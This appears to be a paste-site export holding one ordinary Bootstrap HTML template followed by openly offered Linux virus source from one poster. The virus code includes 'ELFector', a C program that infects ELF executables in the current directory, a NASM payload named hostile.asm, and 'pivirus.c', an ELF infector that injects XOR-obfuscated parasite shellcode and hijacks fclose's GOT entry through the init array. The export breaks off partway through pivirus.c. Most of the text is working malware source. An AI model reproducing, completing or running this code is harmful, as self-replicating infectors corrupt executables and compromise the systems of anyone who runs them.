sr6DGrPw,HTML Bootstrap - Starter,rezamalik15,HTML,Friday 7th of July 2023 09:02:47 PM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Title</title>
    <link href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"" rel=""stylesheet"" integrity=""sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM"" crossorigin=""anonymous"">
</head>
<body>

    <script src=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"" integrity=""sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz"" crossorigin=""anonymous""></script>  
</body>
</html>"
Fj2XhAUr,ELFector - A simple ELF file infector virus,FlyFar,C,Friday 7th of July 2023 08:48:45 PM CDT,"#include<stdio.h>
#include<stdlib.h>
#include<string.h>

int is_file_infected (char filename[])
{
	char output[400];
	char command [400];
	snprintf(command, sizeof command, ""%s%s%s"", ""strings "", filename, ""| grep virus > /tmp/virussearch046.txt"");
	char inf[] = ""virus"";
	FILE *finf;
	system(&command[0]);	
	finf = fopen(""/tmp/virussearch046.txt"", ""r"");
   	fgets(output,399,finf);
    return (strstr(output,inf) != NULL);
}

int is_file_elf(char filename[])
{
    char command[200];
	snprintf(command, sizeof command, ""%s%s%s"", ""file "", filename, "" > /tmp/elfsearch046.txt"");
    char elf[] = ""ELF"";
    char output[200];
    FILE *file;
	system(&command[0]);
    file = fopen(""/tmp/elfsearch046.txt"", ""r"");
    fgets(output,199,file);
    return (strstr(output,elf) != NULL);
}

int main(int argc, char* argv[])
{
    FILE *fp;
	FILE *virus_file,*target_file,*current_file;
	char command[500];
	char filename[100];
   
	system(""ls > /tmp/contents046.txt"");
    fp = fopen(""/tmp/contents046.txt"", ""r"");
    while (!feof(fp))
    {
		fgets(filename,300,fp);
		filename[strlen(filename)-1]='\0';
        if(is_file_elf(filename))
		{
		   if (is_file_infected(filename) == 0)
			{
				snprintf(command, sizeof command, ""%s%s%s%s%s%s"", ""cat virus "", filename, "" > /tmp/infect046.tmp;mv /tmp/infect046.tmp "", filename, "";chmod 777 "", filename);
				system(&command[0]);
				break;
			}
			
		}
	}
	if(strcmp(argv[0],""virus"") == 0 || strcmp(argv[0] , ""./virus"") == 0)
	{
		char delete_command[] = ""find /tmp -name '*046*' -delete"";
		system(&delete_command[0]);
		exit(0);		
	}
	else
	{
		char ch;int i;
		virus_file = fopen(""virus"", ""r"");
		fseek(virus_file,0,SEEK_END);
		int end = ftell(virus_file);
		fclose(virus_file);
	   	current_file = fopen(argv[0],""r"");
		target_file = fopen(""/tmp/target046"",""w"");
		fseek(current_file, end, SEEK_SET);
		while (!feof(current_file))
		{
			ch = fgetc(current_file);
			fputc(ch, target_file);
		}
		fclose(current_file);
		fclose(target_file);
		system(""chmod 777 /tmp/target046"");
		if(argc==1)	
		{
			system(""/tmp/target046"");
		}
		else
		{
			char original_functionality[200] = ""/tmp/target046 "";
			for (i=2; i<=argc; i++)
			{	
				if(i == argc)
					strcat(original_functionality, argv[i-1]);
				else
					{
						strcat(original_functionality, argv[i-1]);
						strcat(original_functionality, "" "");
					}
			}
			system(&original_functionality[0]);			
		}	
	}
	printf(""My name is ELFector and thank you for running me!\n"");
	char delete_command[] = ""find /tmp -name '*046*' -delete"";
	system(&delete_command[0]);
    return 0;
}
"
dAGfujTF,hostile.asm,FlyFar,ASM (NASM),Friday 7th of July 2023 08:41:52 PM CDT,"%define ZERO_ARGS           0x0
%define WRITE_SYSCALL_NUM   0x1
%define STDOUT_FILENO       0x1
%define BUF_LEN             0x1
%define LOOP_COUNTER        0x8000
%define RANDOM_NUM          0x100

%macro do_write_syscall ZERO_ARGS 
    mov rdi, STDOUT_FILENO
    mov rdx, BUF_LEN
    mov rax, WRITE_SYSCALL_NUM
    syscall   
%endmacro

%macro func_ret ZERO_ARGS
    xor rax, rax
    ret
%endmacro

%macro save_regs ZERO_ARGS
    push rbx
    push rdx
    push rcx
    push rdi
    push rsi
    push r8
    push r9
    push r10
%endmacro

%macro restore_regs ZERO_ARGS
    pop r10
    pop r9
    pop r8
    pop rsi
    pop rdi
    pop rcx
    pop rdx
    pop rbx
%endmacro

%macro clear_regs ZERO_ARGS
    xor rax,rax
    xor rbx,rbx
    xor rcx,rcx
    xor rdx,rdx
    xor rdi,rdi
    xor rsi,rsi
    xor r8,r8
    xor r9,r9
    xor r10,r10
%endmacro
    
    
section .text

global pi_hostile_fclose, pi_get_hostile_len


pi_hostile_fclose:


    save_regs
    clear_regs
    
    push RANDOM_NUM

    lea rsi, [ rsp ]    
 
    mov rcx, LOOP_COUNTER

loop_start:
    
    inc byte [ rsi ] 
    
    push rcx
    
    do_write_syscall
    
    pop rcx
    
    loop loop_start

loop_end:

    pop rax
    restore_regs
    func_ret


pi_hostile_fclose_end:


pi_get_hostile_len:
    
    mov  rax, pi_hostile_fclose_end - pi_hostile_fclose
    ret"
vKdqxNaZ,pivirus.c,FlyFar,C,Friday 7th of July 2023 08:40:57 PM CDT,"#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <error.h>
#include <dirent.h>
#include <elf.h>


#define _4KB_PAGE           0x1000
#define _4KB_OFFSET_MASK    0xfff
#define PAGE_SIZE           _4KB_PAGE
#define PAGE_OFFSET_MASK    _4KB_OFFSET_MASK

#define PAGE_ALIGN_LOW(vaddr)    ((vaddr) & ~PAGE_OFFSET_MASK)
#define PAGE_ALIGN_HIGH(vaddr)   (PAGE_ALIGN_LOW(vaddr) + PAGE_SIZE)
#define VADDR_OFFSET(vaddr)      ((vaddr) & PAGE_OFFSET_MASK)


#define PI_MM_ALLOCATED     0x1
#define PI_MM_FREE          0x0
#define PI_MM_POOL_SZ       0x8000
#define PI_POISON_PTR       0x0

#define STRING_EQUAL        0x0
#define STRING_NOT_EQUAL    !STRING_EQUAL

#define MEM_EQUAL           0x0
#define MEM_NOT_EQUAL       !MEM_EQUAL

#define DIRENTS_BUF_SIZE    0x8000


#define PARASITE_ENTRY_SIZE 0x1b
#define PARASITE_OFFSET_1   0x1f
#define PARASITE_OFFSET_2   0x26
#define PARASITE_OFFSET_3   0x2b
#define PARASITE_OFFSET_4   0x50
#define PARASITE_OFFSET_5   0x54
#define PARASITE_LEN        0x60

#define PI_XOR_KEY          0x78

#define PI_OPERATION_SUCCESS  0
#define PI_OPERATION_ERROR   -1

#define PI_SIGNATURE 0x10

#define inline_function __attribute__((always_inline)) inline


#define pi_check_syscall_fault(x)  \
    if ((int64_t)x < 0)            \
        return PI_OPERATION_ERROR  \

/*
 * macro functions to avoid code repeating
*/
#define pi_define_syscall_1(syscall_name,syscall_num,type1,arg1)  \
    int64_t pi_##syscall_name(type1 arg1)                         \
    {                                                             \
        int64_t __ret;                                            \
                                                                  \
        __asm__ volatile                                          \
            (                                                     \
             ""movq  %0,%%rdi                    \n""               \
             ""movq  $""#syscall_num"",%%rax       \n""               \
             ""syscall                           \n""               \
             :                                                    \
             : ""g"" (arg1)                                         \
            );                                                    \
                                                                  \
        __asm__                                                   \
            (                                                     \
             ""movq  %%rax,%0""                                     \
             : ""=g"" (__ret)                                       \
            );                                                    \
                                                                  \
        return __ret;                                             \
    }

#define pi_define_syscall_2(syscall_name,syscall_num,type1,arg1,type2,arg2) \
    int64_t pi_##syscall_name(type1 arg1,type2 arg2)                        \
    {                                                                       \
        int64_t __ret;                                                      \
                                                                            \
        __asm__ volatile                                                    \
            (                                                               \
             ""movq  %0,%%rdi                    \n""                         \
             ""movq  %1,%%rsi                    \n""                         \
             ""movq  $""#syscall_num"",%%rax       \n""                         \
             ""syscall""                                                      \
             :                                                              \
             : ""g"" (arg1), ""g"" (arg2)                                       \
            );                                                              \
                                                                            \
        __asm__                                                             \
            (                                                               \
             ""movq  %%rax,%0""                                               \
             : ""=g"" (__ret)                                                 \
            );                                                              \
                                                                            \
        return __ret;                                                       \
    }

#define pi_define_syscall_3(syscall_name,syscall_num,type1,arg1,type2,arg2,type3,arg3)  \
    int64_t pi_##syscall_name(type1 arg1,type2 arg2,type3 arg3)                         \
    {                                                                                   \
        int64_t __ret;                                                                  \
                                                                                        \
        __asm__ volatile                                                                \
            (                                                                           \
             ""movq  %0,%%rdi                    \n""                                     \
             ""movq  %1,%%rsi                    \n""                                     \
             ""movq  %2,%%rdx                    \n""                                     \
             ""movq  $""#syscall_num"",%%rax       \n""                                     \
             ""syscall""                                                                  \
             :                                                                          \
             : ""g"" (arg1), ""g"" (arg2), ""g"" (arg3)                                       \
            );                                                                          \
                                                                                        \
        __asm__                                                                         \
            (                                                                           \
             ""movq  %%rax,%0""                                                           \
             : ""=g"" (__ret)                                                             \
            );                                                                          \
                                                                                        \
        return __ret;                                                                   \
    }



char fclose_xor_encoded[] = ""\x1e\x1b\x14\x17\x0b\x1d"";


char parasite[] = 
    ""\x50\x53\x57\x56\x52\x51\x55""
    ""\x48\x31\xc0""
    ""\x48\x31\xdb""
    ""\x48\x31\xd2""
    ""\x48\x31\xc9""
    ""\x48\x31\xed""
    ""\xe8\x41\x00\x00\x00""
    ""\x5f""
    ""\x48\x81\xef\x41\x41\x41\x41"" 
    ""\x48\x81\xc7\x43\x43\x43\x43""
    ""\xbe\x42\x42\x42\x42""
    ""\xba\x01\x00\x00\x00""
    ""\x48\x83\xca\x02""
    ""\x48\x83\xca\x04""
    ""\xb8\x0a\x00\x00\x00""
    ""\x0f\x05""
    ""\xe8\x16\x00\x00\x00""
    ""\x58""
    ""\x48\x83\xc0\x18""
    ""\x48\x89\x05\x0c\x00\x00\x00""
    ""\x5d\x59\x5a\x5e\x5f\x5b\x58\xc3""
    ""\xeb\xbd""
    ""\xeb\xe8"";


typedef struct start_args
{
#define DUMMY_SIZE 8 //force arguments to be on stack 
    char *argv[DUMMY_SIZE]; 
}start_args_t;

typedef struct malloc_header
{
    uint32_t stat;
    uint32_t size;
    struct malloc_header *next;
}malloc_header_t;


typedef struct mman
{
    uint8_t *mm_pool_start;
    uint8_t *mm_pool_end;
    uint8_t *mm_cur_brk;
    malloc_header_t *malloc_head;
}mman_t;

typedef struct linux_dirent64
{
    uint64_t d_ino;
    uint64_t d_off;
    uint16_t d_reclen;
    uint8_t  d_type;
    char     d_name[];
}linux_dirent64_t;

typedef struct targetfunc
{
    uint64_t func_got;
    uint64_t func_name_len;
    uint8_t  *func_name;
}targetfunc_t;

typedef struct hostilefunc
{
    uint64_t hostile_addr;
    uint64_t hostile_len;
}hostilefunc_t;


typedef struct elfstructs
{
    Elf64_Ehdr      *ehdr;
    Elf64_Phdr      *phdr;
    Elf64_Phdr      *textphdr;
    Elf64_Shdr      *shdr;
    Elf64_Sym       *dyn_symtab;
    Elf64_Dyn       *dynseg;
    Elf64_Rela      *rela;
    Elf64_Addr      *pltgot;
    Elf64_Rela      *pltrela;
    Elf64_Xword     relasz;
    Elf64_Xword     pltrelsz;
    Elf64_Addr      *initarray;
    Elf64_Addr      gnureloc_start;
    Elf64_Xword     gnureloc_sz;
    uint8_t         *dyn_strtab;
}elfstructs_t;


typedef struct loadsegments
{
    Elf64_Addr      code_vaddr;
    Elf64_Addr      data_vaddr;
    Elf64_Off       code_offset;
    Elf64_Off       data_offset;
    Elf64_Xword     code_size;
    Elf64_Xword     data_size;
}loadsegments_t;


typedef struct elf_flags
{
    uint64_t    bind_now;
}elf_flags_t;


typedef struct target_elf
{
    const char      *name;
    uint8_t         *mmap;
    int64_t         fd;
    uint64_t        filehole;
    elfstructs_t    elfstructs;
    loadsegments_t  loadsegments;
    hostilefunc_t   hostilefunc;
    targetfunc_t    targetfunc;
    elf_flags_t     elf_flags;
    struct stat     stat;
}target_elf_t;



target_elf_t *target_elf;
mman_t mman;



extern uint64_t pi_hostile_fclose(void);
extern uint64_t pi_get_hostile_len(void);


pi_define_syscall_1(close,3,int64_t,fd)

pi_define_syscall_1(chdir,80,const char *,path)

pi_define_syscall_1(exit,60,uint64_t,exit_stat);

pi_define_syscall_2(fstat,5,int64_t,fd,struct stat *,stat_struct)

pi_define_syscall_2(rename,82,const char *,old_name,const char *,new_name)
    
pi_define_syscall_2(chmod,90,const char *,filename,int64_t,mode)

pi_define_syscall_2(munmap,11,uint64_t,addr,uint64_t,size);

pi_define_syscall_3(open,2,const char *,path,int64_t,flags,int64_t,mode)

pi_define_syscall_3(read,0,int64_t,fd,void *,buf,uint64_t,count)

pi_define_syscall_3(write,1,int64_t,fd,const char *,buf,uint64_t,count)

pi_define_syscall_3(mprotect,10,void *,addr,uint64_t,len,int64_t,prot)

pi_define_syscall_3(getdents64,217,int64_t,fd,char *,buf,uint64_t,buf_sz)

pi_define_syscall_3(lseek,8,int64_t,fd,int64_t,offset,int64_t,whence)


void *pi_mmap(void *addr,uint64_t len,int64_t prot,int64_t flags,int64_t fd,int64_t offset)
{
    uint64_t __ret;

    __asm__ volatile 
        (
         ""movq $9,%%rax             \n""
         ""movq %0,%%rdi             \n""
         ""movq %1,%%rsi             \n""
         ""movq %2,%%rdx             \n""
         ""movq %3,%%r10             \n""
         ""movq %4,%%r8              \n""
         ""movq %5,%%r9              \n""
         ""syscall""
         :
         : ""g"" (addr), ""g"" (len), ""g"" (prot), ""g"" (flags), ""g"" (fd), ""g"" (offset)
        );

    __asm__
        (
         ""movq  %%rax,%0""
         : ""=g"" (__ret)
        );

    return (void *)(__ret);

}




inline_function void pi_strcpy(char *dest,const char *src)
{
    while (*src) *dest++ = *src++;
    *dest = *src;
}


inline_function uint64_t pi_strlen(const char *str)
{
    uint64_t len = 0;
    
    while (*str++) ++len;
    
    return len;
}

inline_function void pi_memcpy(void *dest,void *src,uint64_t len)
{
    while(len--) *((uint8_t *)dest++) = *((uint8_t *)src++);
}

inline_function int64_t pi_memcmp(void *mem1,void *mem2,uint64_t len)
{
    while (len--)
    {
        if (*((uint8_t *)mem1++) != *((uint8_t *)mem2++))
            return MEM_NOT_EQUAL;
    }

    return MEM_EQUAL;
}

inline_function void pi_memset(void *mem,uint8_t val,uint64_t len)
{
    while (len--) *((uint8_t *)mem++) = val;
}

void pi_puts(const char *str)
{
    pi_write(STDOUT_FILENO,str,pi_strlen(str));
}

/*
 * gets a memory pool that will be used by pi_malloc 
*/
int64_t pi_mm_getpool(void)
{
    mman.mm_pool_start = pi_mmap(NULL,PI_MM_POOL_SZ,PROT_WRITE | PROT_READ,MAP_ANONYMOUS | MAP_PRIVATE,-1,0);
    pi_check_syscall_fault(mman.mm_pool_start);

    mman.mm_pool_end = mman.mm_pool_start + PI_MM_POOL_SZ;

    mman.mm_cur_brk = mman.mm_pool_start;

    return PI_OPERATION_SUCCESS;
}

void *pi_sbrk(uint32_t size)
{
    void *tmp;

    tmp = (void *)mman.mm_cur_brk;

    mman.mm_cur_brk += size;

    if (mman.mm_cur_brk > mman.mm_pool_end)
        return NULL;
    
    return tmp;
}

void *pi_malloc(uint32_t size)
{
    malloc_header_t *tmp1, *tmp2, *tmp3, *tmp4;

    if (!mman.malloc_head)
    {
        mman.malloc_head = pi_sbrk(size + sizeof(malloc_header_t));

        if (mman.malloc_head == PI_POISON_PTR)
            return (void *)PI_POISON_PTR;

        mman.malloc_head->stat = PI_MM_ALLOCATED;
        mman.malloc_head->size = size;
        mman.malloc_head->next = PI_POISON_PTR;


        return (void *)(mman.malloc_head + 1);
    }

    //search for free block with bsize >= size
    tmp1 = mman.malloc_head;
    while (tmp1)
    {
        if ((tmp1->stat == PI_MM_FREE) && (tmp1->size >= size))
        {
            if (tmp1->size > size)
            {
                //divide the block
                tmp3       = (malloc_header_t *)( (uint8_t *)( tmp1 + 1) + size );
                tmp3->stat = PI_MM_ALLOCATED;
                tmp3->size = tmp1->size - size;
                tmp3->next = tmp1->next;
                tmp1->next = tmp3;
                goto __ret;
            }
            tmp1->stat = PI_MM_ALLOCATED;
__ret:
            return (void *)(tmp1 + 1);
        }
        tmp4 = tmp1;
        tmp1 = tmp1->next;
    }

    tmp2 = pi_sbrk(size + sizeof(malloc_header_t));

    if (tmp2 == PI_POISON_PTR)
        return (void *)PI_POISON_PTR;

    tmp2->size = size;
    tmp2->stat = PI_MM_ALLOCATED;
    tmp2->next = PI_POISON_PTR;

    tmp4->next = tmp2;

    pi_memset(tmp2 + 1,0x0,tmp2->size);

    return (void *)(tmp2 + 1);
}

/*
 * a simple free that just frees the block at the given address
 * there is no adjacent free blocks coalescing
*/ 
void pi_free(void *ptr)
{
    malloc_header_t *tmp1;

    tmp1 = (malloc_header_t *)ptr - 1;
    tmp1->stat = PI_MM_FREE;

    pi_memset(tmp1 + 1,0x0,tmp1->size);
}


inline_function void pi_xor_mem(void *mem,uint64_t len,uint8_t xor_key)
{
    while (len--) *((uint8_t *)mem++) ^= xor_key;
}



int64_t pi_check_target(void)
{
    Elf64_Ehdr *ehdr;
    Elf64_Phdr *phdr;
    char elfmag[] = ELFMAG;
    uint64_t dyn_linked = 0;


    target_elf->fd = pi_open(target_elf->name,O_RDWR,0);
    pi_check_syscall_fault(target_elf->fd);

    pi_check_syscall_fault(pi_fstat(target_elf->fd,&target_elf->stat));

    target_elf->mmap = pi_mmap(NULL,
                               target_elf->stat.st_size,
                               PROT_READ | PROT_WRITE,
                               MAP_SHARED,
                               target_elf->fd,
                               0);
    pi_check_syscall_fault(target_elf->mmap);

    ehdr = (Elf64_Ehdr *)target_elf->mmap;
    phdr = (Elf64_Phdr *)(target_elf->mmap + ehdr->e_phoff);

    if (pi_memcmp(target_elf->mmap,elfmag,SELFMAG) == MEM_NOT_EQUAL)
        return PI_OPERATION_ERROR;
    
    //binary is infected before ? 
    if (ehdr->e_ident[EI_OSABI] == PI_SIGNATURE)
        return PI_OPERATION_ERROR;
    
    if (!((ehdr->e_type == ET_EXEC) || (ehdr->e_type == ET_DYN)))
        return PI_OPERATION_ERROR;
    
    for (uint64_t i = 0; i < ehdr->e_phnum; ++i,++phdr)
    {
        if (phdr->p_type != PT_DYNAMIC)
            continue;
        dyn_linked = 1;
    }

    if (!dyn_linked)
        return PI_OPERATION_ERROR;
    
    return PI_OPERATION_SUCCESS;
}


void pi_do_init(void)
{
    Elf64_Phdr  *tmp_phdr;
    Elf64_Shdr  *tmp_shdr;
    Elf64_Dyn   *tmp_dynseg;
    Elf64_Sym   *tmp_dynsym;
    Elf64_Addr  target_code_vaddr, target_data_vaddr;
    Elf64_Off   target_code_offset, target_data_offset;

    target_elf->elfstructs.ehdr = (Elf64_Ehdr *)target_elf->mmap;
    target_elf->elfstructs.phdr = (Elf64_Phdr *)(target_elf->mmap + target_elf->elfstructs.ehdr->e_phoff);
    target_elf->elfstructs.shdr = (Elf64_Shdr *)(target_elf->mmap + target_elf->elfstructs.ehdr->e_shoff);


    tmp_phdr = target_elf->elfstructs.phdr;
    for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_phnum; ++i, ++tmp_phdr)
    {
        switch (tmp_phdr->p_type)
        {
            case PT_LOAD:
                if (tmp_phdr->p_flags & PF_X)
                {
                    target_elf->loadsegments.code_vaddr   = tmp_phdr->p_vaddr;
                    target_elf->loadsegments.code_offset  = tmp_phdr->p_offset;
                    target_elf->loadsegments.code_size    = tmp_phdr->p_memsz;
                    target_elf->elfstructs.textphdr       = tmp_phdr;
                
                    target_code_vaddr  = target_elf->loadsegments.code_vaddr;
                    target_code_offset = target_elf->loadsegments.code_offset;
                
                }
                target_elf->loadsegments.data_vaddr  = tmp_phdr->p_vaddr;
                target_elf->loadsegments.data_offset = tmp_phdr->p_offset;

                target_data_vaddr  = target_elf->loadsegments.data_vaddr;
                target_data_offset = target_elf->loadsegments.data_offset;
                break;

            case PT_DYNAMIC:
                target_elf->elfstructs.dynseg = (Elf64_Dyn *)(target_elf->mmap + tmp_phdr->p_offset);
                break;
            
            case PT_GNU_RELRO:
                target_elf->elfstructs.gnureloc_sz    = tmp_phdr->p_memsz;
                target_elf->elfstructs.gnureloc_start = tmp_phdr->p_vaddr - target_elf->elfstructs.textphdr->p_vaddr;
                break;
        }
    }

    tmp_dynseg = target_elf->elfstructs.dynseg;
    for (; tmp_dynseg->d_tag != DT_NULL; ++tmp_dynseg)
    {
        switch (tmp_dynseg->d_tag)
        {
            case DT_SYMTAB:
                target_elf->elfstructs.dyn_symtab = (Elf64_Sym *)(target_elf->mmap + target_code_offset +
                                                                     (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_STRTAB:
                target_elf->elfstructs.dyn_strtab = target_elf->mmap + target_code_offset +
                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr);
                break;

            case DT_JMPREL:
                target_elf->elfstructs.pltrela = (Elf64_Rela *)(target_elf->mmap + target_code_offset +
                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_PLTGOT:
                target_elf->elfstructs.pltgot = (Elf64_Addr *)(target_elf->mmap + target_data_offset + 
                                                                    (tmp_dynseg->d_un.d_ptr - target_data_vaddr));
            case DT_RELA:
                target_elf->elfstructs.rela = (Elf64_Rela *)(target_elf->mmap + target_code_offset + 
                                                                    (tmp_dynseg->d_un.d_ptr - target_code_vaddr));
                break;

            case DT_RELASZ:
                target_elf->elfstructs.relasz = tmp_dynseg->d_un.d_val;
                break;

            case DT_PLTRELSZ:
                target_elf->elfstructs.pltrelsz = tmp_dynseg->d_un.d_val;
                break;

            case DT_FLAGS_1:
                if (tmp_dynseg->d_un.d_val & DF_1_NOW)
                    ++target_elf->elf_flags.bind_now;
                break;

            case DT_INIT_ARRAY:
                target_elf->elfstructs.initarray = (Elf64_Addr *)(target_elf->mmap + (tmp_dynseg->d_un.d_ptr -
                                                                                           target_data_vaddr + target_data_offset));
                break;
        }
    }

    target_elf->hostilefunc.hostile_addr = (uint64_t)pi_hostile_fclose;
    target_elf->hostilefunc.hostile_len  = pi_get_hostile_len();

}


int32_t pi_symbol_lookup(void)
{
    char *dynstrtab;
    char *sym_name;
    Elf64_Rela  *rel;
    Elf64_Xword relsz;
    Elf64_Sym   *dynsymtab;
        

    if (target_elf->elf_flags.bind_now && !target_elf->elfstructs.pltrela)
    {
        rel     = target_elf->elfstructs.rela;
        relsz   = target_elf->elfstructs.relasz;

    }else
    {
        rel     = target_elf->elfstructs.pltrela;
        relsz   = target_elf->elfstructs.pltrelsz;
    }


    dynsymtab = target_elf->elfstructs.dyn_symtab;
    dynstrtab = target_elf->elfstructs.dyn_strtab;

    target_elf->targetfunc.func_name_len = pi_strlen(fclose_xor_encoded);
    target_elf->targetfunc.func_name     = pi_malloc(target_elf->targetfunc.func_name_len);

    pi_memcpy(target_elf->targetfunc.func_name,
              fclose_xor_encoded,
              target_elf->targetfunc.func_name_len);

    pi_xor_mem(target_elf->targetfunc.func_name,
               target_elf->targetfunc.func_name_len,
               PI_XOR_KEY);

    
    for (Elf64_Xword i = 0; i < (relsz / sizeof(Elf64_Rela)); ++i, ++rel)
    {
        sym_name = &dynstrtab[dynsymtab[ELF64_R_SYM(rel->r_info)].st_name];
        if (pi_memcmp(sym_name,target_elf->targetfunc.func_name,target_elf->targetfunc.func_name_len) == MEM_EQUAL)
                target_elf->targetfunc.func_got = (Elf64_Addr)rel->r_offset;
    }

    pi_free(target_elf->targetfunc.func_name);

    if (!target_elf->targetfunc.func_got)
        return PI_OPERATION_ERROR;

    return PI_OPERATION_SUCCESS;
}



/*
 * flcose's GOT entry hijacking is done @ runtime with the following algorithm:
 *      - let r be any register
 *      - (r) holds hostile function address
 *      - [ fclose_got_entry_offset + rip ]  <- r , let this instruction's address be #modify_got
 *      - [ addr ] is the address of the next instruction that modifies the GOT entry (the next to [#modify_got])
 *      - [ diff ] is the offset between the target GOT entry and [ addr ]
 *
 *      - so it will be like this
 *         - mov $address_of_hostile, diff(%rip) 
 *
 * the parasite takes care of ELF binaries that have the BIND_NOW flag so the entry of the parasite
 * mprotects the GNU_RELRO PAGES to be writeable  
*/

void pi_edit_parasite(void)
{
    uint64_t diff, addr, var1, var2, var3;

    var1 = target_elf->loadsegments.code_size + PARASITE_ENTRY_SIZE;

    var2 = PAGE_ALIGN_LOW(target_elf->elfstructs.gnureloc_start);

    var3 = target_elf->elfstructs.gnureloc_sz;

    addr = target_elf->loadsegments.code_vaddr + 
                        target_elf->loadsegments.code_size + 
                                                    PARASITE_OFFSET_5;

    diff = target_elf->targetfunc.func_got - addr;

    *((uint32_t *)&parasite[PARASITE_OFFSET_1]) = (uint32_t)var1;
    *((uint32_t *)&parasite[PARASITE_OFFSET_2]) = (uint32_t)var2;
    *((uint32_t *)&parasite[PARASITE_OFFSET_3]) = (uint32_t)var3;
    *((uint32_t *)&parasite[PARASITE_OFFSET_4]) = (uint32_t)diff;
}

int64_t pi_create_infected_clone(void)
{
    char     tmpfile[] = ""/tmp/.tmp.PI314X_OC"";
    char     buf[PAGE_SIZE];
    int64_t  tmpfile_fd, syscall_ret;
    int64_t  infected_clone_mode, tmpfile_mode;
    uint64_t buf1_sz, buf2_sz, buf3_sz;
    
    //mark binary as infected
    target_elf->elfstructs.ehdr->e_ident[EI_OSABI] = PI_SIGNATURE;

    tmpfile_mode        = S_IRUSR | S_IWUSR;
    infected_clone_mode = tmpfile_mode | S_IXUSR;
    
    tmpfile_fd = pi_open(tmpfile,O_CREAT | O_RDWR,tmpfile_mode);
    pi_check_syscall_fault(tmpfile_fd);

    buf1_sz = target_elf->loadsegments.code_offset + 
                        target_elf->loadsegments.code_size + 
                                target_elf->filehole;
    
    buf2_sz = ( PARASITE_LEN + target_elf->hostilefunc.hostile_len ) > target_elf->filehole ? PAGE_SIZE : 0;
    
    buf3_sz = target_elf->stat.st_size - buf1_sz;

    syscall_ret = pi_write(tmpfile_fd,target_elf->mmap,buf1_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,buf,buf2_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,target_elf->mmap + buf1_sz,buf3_sz);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_lseek(tmpfile_fd,
                           target_elf->loadsegments.code_offset + 
                           target_elf->loadsegments.code_size,
                           SEEK_SET);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,parasite,PARASITE_LEN);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_write(tmpfile_fd,
                          (const char *)target_elf->hostilefunc.hostile_addr,
                          target_elf->hostilefunc.hostile_len);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_close(tmpfile_fd);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_chmod(tmpfile,infected_clone_mode);
    pi_check_syscall_fault(syscall_ret);

    syscall_ret = pi_rename(tmpfile,target_elf->name);
    pi_check_syscall_fault(syscall_ret);

    return PI_OPERATION_SUCCESS;
}

void pi_infect_target(void)
{
    Elf64_Phdr  *elfphdr;
    Elf64_Shdr  *elfshdr;
    Elf64_Rela  *elfrela;
    Elf64_Addr  target_code_vaddr, target_data_vaddr;
    Elf64_Off   target_code_offset, target_data_offset;
    Elf64_Xword target_code_size, target_data_size;
    uint64_t    flag, parasite_len, off, addr;
    uint8_t old_osabi;

    if (pi_check_target() == PI_OPERATION_ERROR)
        goto target_cleanup;

    pi_do_init();

    if (pi_symbol_lookup() == PI_OPERATION_ERROR)
        goto target_cleanup;


    elfphdr = target_elf->elfstructs.phdr;
    elfshdr = target_elf->elfstructs.shdr;
    elfrela = target_elf->elfstructs.rela;

    target_code_vaddr  = target_elf->loadsegments.code_vaddr;
    target_data_vaddr  = target_elf->loadsegments.data_vaddr;

    target_code_offset = target_elf->loadsegments.code_offset;
    target_data_offset = target_elf->loadsegments.data_offset;

    target_code_size   = target_elf->loadsegments.code_size;
    target_data_size   = target_elf->loadsegments.data_size;

    flag         = 1;
    parasite_len = PARASITE_LEN;

    if ((parasite_len  + target_elf->hostilefunc.hostile_len) > 
             (PAGE_SIZE - VADDR_OFFSET(target_code_vaddr + target_code_size)))
        return;


    for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_phnum; ++i, ++elfphdr)
    {
        if (elfphdr->p_offset > (target_code_offset + target_code_size))
        {
            if (flag)
            {
                target_elf->filehole = elfphdr->p_offset - (target_code_offset + target_code_size);
                --flag;
            }
            if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
                elfphdr->p_offset += PAGE_SIZE;
        }
    }
    
    if (target_elf->elfstructs.shdr)
    {
        for (Elf64_Half i = 0; i < target_elf->elfstructs.ehdr->e_shnum; ++i, ++elfshdr)
        {
            if ((elfshdr->sh_offset + elfshdr->sh_size) == (target_code_offset + target_code_size))
                elfshdr->sh_size += parasite_len;

            if (elfshdr->sh_offset > (target_code_offset + target_code_size))
            {
                if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
                    elfshdr->sh_offset += PAGE_SIZE;
            }
        }
        if ((parasite_len + target_elf->hostilefunc.hostile_len) > target_elf->filehole)
            target_elf->elfstructs.ehdr->e_shoff += PAGE_SIZE;
    }

    /*
     * - pivirus doesn't alter the original entry point of the target , instead the entry in the init array section that
     *   corresponds to frame dummy function's address is overwritten with the address of the parasite's entry point
     * 
     * - for ET_DYN binaries there will be a relocation entry for every entry in the init array section with the r_addend member
     *   of the relocation entry holding the offset of the function in the binary, so the dynamic linker will add the loading
     *   address of the binary to r_addend value and modify the  init array section's entry @ r_offset
     */
    if (target_elf->elfstructs.ehdr->e_type == ET_DYN)
    {
